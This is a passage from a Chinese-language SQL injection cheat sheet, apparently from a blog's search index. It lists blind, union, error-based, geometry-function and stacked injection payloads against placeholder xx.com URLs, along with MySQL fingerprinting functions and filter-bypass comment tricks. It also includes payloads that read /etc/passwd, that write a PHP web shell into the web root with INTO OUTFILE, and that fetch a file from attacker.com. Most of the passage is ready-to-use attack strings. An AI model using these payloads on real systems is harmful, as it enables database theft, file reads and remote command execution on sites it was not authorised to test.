class="line">布尔盲注：通过观察页面响应是否变化来推测数据库的内容，例如：&#x27; AND 1=1 -- 和 &#x27; AND 1=2 --。</span><br><span class="line">时间盲注：通过观察数据库响应延迟来判断查询的真假，例如：&#x27; AND SLEEP(5) --。</span><br><span class="line">联合查询注入（Union-based SQL Injection）：使用UNION SELECT来合并多个查询，尝试获取数据库中的其他表数据。</span><br><span class="line">报错注入（Error-based SQL Injection）：通过生成SQL错误，泄露数据库结构信息。</span><br></pre></td></tr></table></figure><p><strong>Mysql 中常用的函数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">version():查询数据库的版本</span><br><span class="line">user():查询数据库的使用者</span><br><span class="line">database():数据库</span><br><span class="line">system_user():系统用户名</span><br><span class="line">session_user():连接数据库的用户名</span><br><span class="line">current_user():当前用户名</span><br><span class="line">load_file():读取本地文件</span><br><span class="line">@@datadir:读取数据库路径</span><br><span class="line">@@basedir:mysql安装路径</span><br><span class="line">@@version_complie_os:查看操作系统</span><br><span class="line">@@version：SQL查询常见的数据库版本信息。</span><br><span class="line">@@servername：SQL查询数据库服务器名称。</span><br><span class="line">@@language：SQL查询当前数据库语言设置。</span><br><span class="line">@@spid：SQL查询当前会话ID（进程ID）。</span><br></pre></td></tr></table></figure><p><strong>测试列数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例如 </span><br><span class="line">http://xx.com/index.asp?id=12+union+select+null,null-- ，不断增加 </span><br><span class="line">null 至不返回</span><br></pre></td></tr></table></figure><p><strong>报错注入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://xx.com/product.php?id=12 and select 1/0：用来触发除零错误，从而可以获取数据库错误信息，帮助推测数据库类型。</span><br><span class="line">http://xx.com/product.php?id=12 and *select 1 from (select count(*), concat(version(), floor(rand(0)2))x from information_schema.tables group by x)a：通过查询数据库信息并触发错误来暴露数据库版本信息。</span><br><span class="line">http://xx.com/product.php?id=12 and extractvalue(1, concat(0x5c, (select user())))：利用XML函数extractvalue来注入并获取数据库用户信息。</span><br><span class="line">http://xx.com/product.php?id=12 and updatexml(0x3a, concat(1, (select user())), 1)：类似于extractvalue，用于从XML中提取数据。</span><br><span class="line">http://xx.com/product.php?id=12 and exp(~(SELECT * from(select user())a))：通过调用exp函数触发错误并获取数据库用户信息。</span><br><span class="line">http://xx.com/product.php?id=12 and ST_LatFromGeoHash((select * from(select * from(select user())a)b))：利用空间数据函数进行注入。</span><br></pre></td></tr></table></figure><p><strong>基于geometric的报错注入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://xx.com/product.php?id=12 and GeometryCollection((select * from(select * from(select user())a)b))：触发错误信息并通过几何类型函数获取用户信息。</span><br><span class="line">http://xx.com/product.php?id=12 and polygon((select * from(select * from(select user())a)b))：同样触发错误，通过polygon函数。</span><br><span class="line">http://xx.com/product.php?id=12 and multipoint((select * from(select * from(select user())a)b))：几何类型函数的一种。</span><br><span class="line">http://xx.com/product.php?id=12 and multilinestring((select * from(select * from(select user())a)b))：几何类型函数，用于注入。</span><br><span class="line">http://xx.com/product.php?id=12 and LINESTRING((select * from(select * from(select user())a)b))：几何类型函数之一，用于注入。</span><br><span class="line">http://xx.com/product.php?id=12 and multipolygon((select * from(select * from(select user())a)b))：几何类型函数，用于注入。</span><br></pre></td></tr></table></figure><p>其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效而以上列表中基于geometric的报错注入在这个 commit 5caea4 中被修复，在5.5.x较后的版本中同样不再生效</p><p><strong>堆叠注入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xx.com/product.php?id=12 and ;select 1：使用分号（;）来结束当前查询并开始新的查询。</span><br></pre></td></tr></table></figure><p><strong>注释符</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如：http://xx.com/product.php?id=12#</span><br><span class="line">#：注释符，SQL中用来注释掉后续的语句。</span><br><span class="line">--+：SQL注释符，</span><br><span class="line">--用于注释，</span><br><span class="line">+可绕过某些过滤器。</span><br><span class="line">/xxx/：块注释，SQL注释的一种形式。</span><br><span class="line">/!xxx/：条件注释，仅在特定版本的MySQL中生效，通常用于版本差异化操作。</span><br><span class="line">/!50000xxx/：MySQL特定版本支持的注释格式，通常用于绕过过滤。</span><br></pre></td></tr></table></figure><p><strong>判断过滤规则</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">是否有trunc：检查是否存在截断字符。</span><br><span class="line">是否过滤某个字符：检查是否有过滤掉特定字符，如单引号、双引号等。</span><br><span class="line">是否过滤关键字：检查是否有过滤掉SQL关键字，如select, union, insert等。</span><br><span class="line">slash和编码：检查是否需要对斜杠或字符进行编码或转义。</span><br></pre></td></tr></table></figure><p><strong>获取信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">判断数据库类型</span><br><span class="line">and exists(select * from msysobjects) &gt; 0：针对Access数据库。</span><br><span class="line">and exists(select * from sysobjects) &gt; 0：针对SQL Server数据库。</span><br><span class="line">判断数据库表</span><br><span class="line">and exists (select * from admin)：检查是否存在admin表，用来验证表名。</span><br><span class="line">确定字段数</span><br><span class="line">Order By：常用于通过排序获取不同字段数目，帮助注入者确认表的列数。</span><br></pre></td></tr></table></figure><p><strong>测试权限</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">读敏感文件：测试是否能够读取敏感文件，如/etc/passwd（类Unix系统）、Windows系统中的boot.ini等。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT load_file(&#x27;/etc/passwd&#x27;) --</span><br><span class="line"></span><br><span class="line">写shell：测试是否能够上传并执行恶意脚本（shell）。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/shell.php&#x27; --</span><br><span class="line"></span><br><span class="line">文件操作：测试是否能够对文件进行修改或删除操作。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT &quot;&lt;?php echo &#x27;Hello&#x27;; ?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/hello.php&#x27; --</span><br></pre></td></tr></table></figure><p><strong>网络请求</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">带外通道：使用HTTP请求、DNS请求、SMTP等协议发送数据，从而建立与攻击者的通信通道。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT load_file(&#x27;http://attacker.com/shell.txt&#x27;) --</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞挖掘方法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入篇 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
